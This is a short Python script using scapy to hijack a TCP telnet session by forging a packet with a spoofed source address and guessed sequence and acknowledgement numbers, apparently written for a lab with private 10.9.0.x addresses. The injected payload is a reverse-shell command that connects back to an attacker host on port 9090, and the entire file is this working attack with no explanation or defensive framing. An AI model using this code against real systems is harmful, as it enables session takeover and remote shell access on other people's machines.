#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.7", dst="10.9.0.5")
tcp = TCP(sport=35062, dport=23, flags="A", seq=4180794967, ack=1151693991)
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
sniff()